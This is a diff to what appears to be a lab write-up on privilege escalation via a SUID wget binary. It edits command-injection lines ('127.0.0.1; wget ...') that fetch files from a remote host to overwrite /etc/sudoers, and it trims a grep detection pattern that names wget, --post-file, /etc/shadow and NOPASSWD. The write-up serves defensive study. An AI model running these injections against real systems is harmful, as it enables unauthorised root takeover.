@@ -105,7 +105,7 @@ Defence question: what should a defender see when a low-privileged web account g
 - Write it with SUID `wget`:
 
     ```sh
-    127.0.0.1; wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva; chmod 440 /etc/sudoers.d/flaskva
+    127.0.0.1; wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva
     ```
 
 - Test root access:
@@ -151,7 +151,7 @@ Defence question: what should a defender see when a low-privileged web account g
 - Overwrite `/etc/sudoers` with SUID `wget`:
 
     ```sh
-    127.0.0.1; wget http://192.168.8.10:8000/sudoers -O /etc/sudoers; chmod 440 /etc/sudoers
+    127.0.0.1; wget http://192.168.8.10:8000/sudoers -O /etc/sudoers
     ```
 
 - Test root access:
@@ -373,7 +373,7 @@ netstat -t -u -n -a -p
 ### SUID wget scenario
 
 ```sh
-grep -r -n -E -i "whoami|find / -perm|/usr/bin/wget|wget|--post-file|/etc/passwd|/etc/shadow|/etc/sudoers|NOPASSWD|sudo -n|chmod 440" /var/log
+grep -r -n -E -i "whoami|find / -perm|/usr/bin/wget|wget|--post-file|/etc/passwd|/etc/shadow|/etc/sudoers|NOPASSWD|sudo -n" /var/log
 ```
 
 ```sh
